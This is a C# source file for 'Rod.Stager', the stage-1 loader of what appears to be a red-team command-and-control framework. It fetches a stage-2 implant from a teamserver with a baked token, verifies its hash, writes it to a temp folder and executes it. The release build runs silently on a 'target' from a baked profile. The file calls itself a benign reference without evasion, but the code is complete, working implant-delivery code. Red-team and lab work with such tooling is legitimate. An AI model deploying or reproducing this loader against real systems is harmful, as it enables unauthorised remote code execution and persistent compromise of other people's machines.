// Rod.Stager is the reference .NET stage-1 loader (architecture.md Sec 6): it
// fetches a built stage-2 payload from the teamserver -- each fetch spending
// one use of the loader's own baked credential -- verifies it against the
// sha256 baked at build time, and runs it; the stage-2 then enrolls on the
// credential baked into its own profile. It is a benign reference: no
// evasion, no obfuscation, and no destructive behavior (architecture.md
// Sec 7). The whole program is one fetch-and-exec -- the smallest footprint a
// first-stage loader can honestly have: no protocol bindings, no packages, no
// key material. The release build is the fielded shape: configuration is the
// bake and nothing else, arguments and environment are ignored, and the
// console stays silent beyond fatal one-liners. The debug build is the dev
// shape: flags and env drive the checked-in empty profile stub, and the run
// narrates.

using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using Rod.Stager;

return await StagerApp.RunAsync(args);

internal static class StagerApp
{
    public static async Task<int> RunAsync(string[] args)
    {
        using var cts = new CancellationTokenSource();
        Console.CancelKeyPress += (_, e) =>
        {
            e.Cancel = true;
            cts.Cancel();
        };

        // The two builds of this binary: DEBUG is the dev shape -- flags and
        // the ROD_* environment drive the checked-in empty BakedProfile stub,
        // and the run narrates to stderr. RELEASE is the fielded shape --
        // configuration is the bake and nothing else, arguments and
        // environment are ignored entirely, and the console belongs to the
        // target: narration is compiled out, with only the fatal one-liners
        // (a failed fetch, a hash mismatch) still printing.
#if DEBUG
        LoadBaked();

        string runtimeToken;
        string enrollUrl;
        string payloadId;
        string outDir;
        string? beaconUrl;
        string? caCertPath;
        try
        {
            (runtimeToken, enrollUrl, payloadId, outDir, beaconUrl, caCertPath) = ParseArgs(args);
        }
        catch (ExitProgramException ex)
        {
            if (ex.Message is { Length: > 0 } msg)
                Console.Error.WriteLine("rod-stager: " + msg);
            return ex.ExitCode;
        }

        // A bake, when one is present, overrides whatever the flags and env
        // supplied -- the same authority the fielded shape runs under.
        if (BakedEnrollUrl.Length > 0)
            enrollUrl = BakedEnrollUrl;
        if (BakedPayloadId.Length > 0)
            payloadId = BakedPayloadId;
        var token = BakedToken.Length > 0 ? BakedToken : runtimeToken;
        if (token.Length == 0)
        {
            Console.Error.WriteLine("rod-stager: a stager token is required (-token, ROD_STAGER_TOKEN, or a bake)");
            return 1;
        }
        if (enrollUrl.Length == 0)
        {
            Console.Error.WriteLine("rod-stager: an enroll URL is required (-enroll-url, or bake one into the artifact)");
            return 1;
        }
        if (payloadId.Length == 0)
        {
            Console.Error.WriteLine("rod-stager: a stage-2 payload id is required (-payload, or bake one into the artifact)");
            return 1;
        }

        var log = Console.Error;
#else
        LoadBaked();

        var enrollUrl = BakedEnrollUrl;
        var payloadId = BakedPayloadId;
        var token = BakedToken;
        var outDir = Path.Combine(Path.GetTempPath(), "rod-stager-" + Guid.NewGuid().ToString("N"));
        string? beaconUrl = null;
        string? caCertPath = null;
        if (enrollUrl.Length == 0 || payloadId.Length == 0 || token.Length == 0)
        {
            Console.Error.WriteLine(
                "rod-stager: this release build carries no baked profile; field a pipeline-built artifact");
            return 2;
        }

        var log = TextWriter.Null;
#endif

        if (KillDatePassed())
        {
            Console.Error.WriteLine("rod-stager: kill date has passed; refusing to run");
            return 1;
        }

        // The fetch rides the same anonymous listener enroll does, and it
        // spends one use of the loader's credential: the download gate is
        // the whole job of this token, and the enrollment that follows rides
        // the credential baked into the stage-2 itself.
        var fetchUrl = FetchUrl(enrollUrl, payloadId);
        log.WriteLine($"rod-stager: fetching stage-2 {payloadId} from {BaseOf(fetchUrl)}");
        byte[] stage2;
        try
        {
            stage2 = await FetchAsync(fetchUrl, token, caCertPath, cts.Token);
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine("rod-stager: fetch: " + ex.Message);
            return 1;
        }

        // The integrity anchor baked at build time (architecture.md Sec 6): a
        // fetch that does not hash to the recorded fingerprint is refused, so a
        // tampered transport cannot make the loader run substituted bytes.
        var actual = Convert.ToHexString(SHA256.HashData(stage2)).ToLowerInvariant();
        if (ExpectedSha256.Length > 0 && actual != ExpectedSha256)
        {
            Console.Error.WriteLine($"rod-stager: stage-2 hash mismatch: expected {ExpectedSha256}, received {actual}");
            return 1;
        }

        // The fetched artifact is a self-contained single-file executable
        // (architecture.md Sec 6); running it means executing the file. The
        // stage-2's own baked profile carries everything it needs --
        // endpoint, credential, cadence -- so nothing operational is handed
        // across the process boundary.
        var stage2Path = Path.Combine(outDir, OperatingSystem.IsWindows() ? "Rod.Implant.exe" : "Rod.Implant");
        try
        {
            Directory.CreateDirectory(outDir);
            await File.WriteAllBytesAsync(stage2Path, stage2, cts.Token);
            if (!OperatingSystem.IsWindows())
                File.SetUnixFileMode(stage2Path,
                    UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.UserExecute
                    | UnixFileMode.GroupRead | UnixFileMode.GroupExecute
                    | UnixFileMode.OtherRead | UnixFileMode.OtherExecute);
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine("rod-stager: write: " + ex.Message);
            return 1;
        }

        log.WriteLine($"rod-stager: running stage-2 ({stage2.Length} bytes)");
        var start = new System.Diagnostics.ProcessStartInfo
        {
            FileName = stage2Path,
            UseShellExecute = false,
        };
        // Nothing operational crosses the process boundary: the stage-2's
        // bake carries its endpoint, credential, and cadence, and its own
        // precedence rules make them immune to the environment anyway. The
        // two lab-only forwards serve an unbaked dev stage-2 -- an explicit
        // beacon address covers the split topology, and the CA pin gives the
        // beacon mTLS the same teamserver identity the loader was told to
        // trust. A credential never forwards: the loader's is its fetch
        // gate, spent above, and the stage-2 spends its own at enroll.
        if (beaconUrl is { Length: > 0 })
            start.Environment["ROD_BEACON_URL"] = beaconUrl;
        if (caCertPath is { Length: > 0 })
            start.Environment["ROD_CA_CERT"] = caCertPath;
        using var process = System.Diagnostics.Process.Start(start)
            ?? throw new InvalidOperationException("failed to start the stage-2 process");
        await process.WaitForExitAsync(cts.Token);
        return process.ExitCode;
    }

    // --- Run-time configuration: the bake is authoritative, flags and env
    //     only fill an unbaked dev run. ---

    private static string ExpectedSha256 { get; set; } = "";

    // The fetch credential baked at build time, when the build minted one.
    // Held here and presented at the fetch -- never seeded into the child's
    // environment, never overridable at run time.
    private static string BakedToken { get; set; } = "";

    // The fetch reference baked at build time: the listener the loader
    // fetches from and the stage-2 payload id it fetches. Both override any
    // run-time value once baked.
    private static string BakedEnrollUrl { get; set; } = "";

    private static string BakedPayloadId { get; set; } = "";

    private static (string Token, string EnrollUrl, string PayloadId, string OutDir, string? BeaconUrl, string? CaCertPath) ParseArgs(
        string[] args)
    {
        var token = Environment.GetEnvironmentVariable("ROD_STAGER_TOKEN") ?? "";
        var enrollUrl = Environment.GetEnvironmentVariable("ROD_ENROLL_URL") ?? "";
        var payloadId = Environment.GetEnvironmentVariable("ROD_STAGE2_PAYLOAD_ID") ?? "";
        var outDir = "";
        string? beaconUrl = null;
        string? caCert = null;

        for (var i = 0; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "-h" or "--help":
                    Console.Error.WriteLine(
                        "usage: rod-stager -token <secret> [-enroll-url <url>] [-payload <guid>] [-beacon-url <host:port>] [-out-dir <dir>] [-ca-cert <pem>]");
                    throw new ExitProgramException(0, null);
                case "-token" or "--token":
                    token = Value(args, ref i);
                    break;
                case "-enroll-url" or "--enroll-url":
                    enrollUrl = Value(args, ref i);
                    break;
                case "-payload" or "--payload":
                    payloadId = Value(args, ref i);
                    break;
                case "-beacon-url" or "--beacon-url":
                    beaconUrl = Value(args, ref i);
                    break;
                case "-out-dir" or "--out-dir":
                    outDir = Value(args, ref i);
                    break;
                case "-ca-cert" or "--ca-cert":
                    caCert = Value(args, ref i);
                    break;
                default:
                    throw new ExitProgramException(1, $"unknown flag {args[i]}");
            }
        }

        if (outDir.Length == 0)
            outDir = Path.Combine(Path.GetTempPath(), "rod-stager-" + Guid.NewGuid().ToString("N"));

        // The required-field checks live in RunAsync, after the baked values
        // have been applied over these: a baked loader supplies them itself,
        // and an unbaked run must present them via flag or env.
        return (token, enrollUrl, payloadId, outDir, beaconUrl, caCert);
    }

    private static string Value(string[] args, ref int i)
    {
        if (i + 1 >= args.Length)
            throw new ExitProgramException(1, $"{args[i]} expects a value");
        i++;
        return args[i];
    }

    // Loads the build-time baked profile (the generated BakedProfile class)
    // into the fields the bake owns. Operational keys -- the fetch
    // reference and the credential -- never touch the environment, so a
    // fielded loader cannot be re-pointed or re-credentialed. Malformed
    // baked data is ignored -- a bad bake must not crash the loader.
    private static void LoadBaked()
    {
        var baked = BakedProfile.Json;
        if (baked.Length == 0)
            return;
        try
        {
            var raw = DecodeBase64Url(baked);
            using var doc = System.Text.Json.JsonDocument.Parse(raw);
            var root = doc.RootElement;
            BakedString(root, "enrollURL", value => BakedEnrollUrl = value);
            BakedString(root, "stage2PayloadId", value => BakedPayloadId = value);
            BakedString(root, "token", value => BakedToken = value);
            BakedString(root, "stage2Sha256", value => ExpectedSha256 = value);
            BakedString(root, "killDate", value => BakedKillDate = value);
        }
        catch
        {
            // Ignore a malformed bake; flags and env still work.
        }
    }

    private static void BakedString(System.Text.Json.JsonElement root, string jsonKey, Action<string> apply)
    {
        if (root.TryGetProperty(jsonKey, out var value)
            && value.ValueKind == System.Text.Json.JsonValueKind.String)
        {
            var s = value.GetString();
            if (!string.IsNullOrEmpty(s))
                apply(s);
        }
    }

    // The kill date the loader refuses to run past: the baked fuse when the
    // bake carries one, else a run-time value for the unbaked dev shape.
    private static string BakedKillDate { get; set; } = "";

    private static bool KillDatePassed()
    {
        var raw = BakedKillDate.Length > 0 ? BakedKillDate : Environment.GetEnvironmentVariable("ROD_KILL_DATE");
        if (raw is null)
            return false;
        if (!DateTimeOffset.TryParse(raw, out var killDate))
            return false;
        return DateTimeOffset.Now > killDate;
    }

    // --- The fetch: plain HTTP(S) GET with the token in a header. ---

    private static async Task<byte[]> FetchAsync(
        string url, string token, string? caCertPath, CancellationToken cancellationToken)
    {
        using var handler = new SocketsHttpHandler();
        if (caCertPath is { Length: > 0 })
        {
            var ca = new X509Certificate2Collection();
            ca.ImportFromPemFile(caCertPath);
            handler.SslOptions.RemoteCertificateValidationCallback = (_, cert, chain, _) =>
            {
                if (cert is null || chain is null)
                    return false;
                chain.ChainPolicy.TrustMode = X509ChainTrustMode.CustomRootTrust;
                foreach (var root in ca)
                    chain.ChainPolicy.CustomTrustStore.Add(root);
                return chain.Build((X509Certificate2)cert);
            };
        }

        using var client = new HttpClient(handler, disposeHandler: true);
        using var request = new HttpRequestMessage(HttpMethod.Get, url);
        request.Headers.Add("X-Stager-Token", token);
        using var response = await client.SendAsync(request, cancellationToken);
        if (!response.IsSuccessStatusCode)
            throw new InvalidOperationException($"the teamserver answered {((int)response.StatusCode)} {(response.ReasonPhrase ?? "")}".TrimEnd());
        return await response.Content.ReadAsByteArrayAsync(cancellationToken);
    }

    // Derives the fetch URL off the enroll URL: the stage-2 route hangs off the
    // same listener root (architecture.md Sec 8 -- the anonymous implant
    // listener serves both enroll and the staged fetch).
    private static string FetchUrl(string enrollUrl, string payloadId)
    {
        const string suffix = "/implants/enroll";
        var root = enrollUrl;
        if (root.EndsWith(suffix, StringComparison.OrdinalIgnoreCase))
            root = root[..^suffix.Length];
        return root.TrimEnd('/') + "/implants/stage2/" + payloadId;
    }

    private static string BaseOf(string url)
    {
        var scheme = url.IndexOf("://", StringComparison.Ordinal);
        if (scheme < 0)
            return url;
        var authorityEnd = url.IndexOf('/', scheme + 3);
        return authorityEnd < 0 ? url : url[..authorityEnd];
    }

    private static string DecodeBase64Url(string value)
    {
        var padded = value.Replace('-', '+').Replace('_', '/');
        padded = padded.PadRight((padded.Length + 3) & ~3, '=');
        return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(padded));
    }

    private sealed class ExitProgramException : Exception
    {
        public int ExitCode { get; }

        public ExitProgramException(int exitCode, string? message)
            : base(message ?? "")
            => ExitCode = exitCode;
    }
}
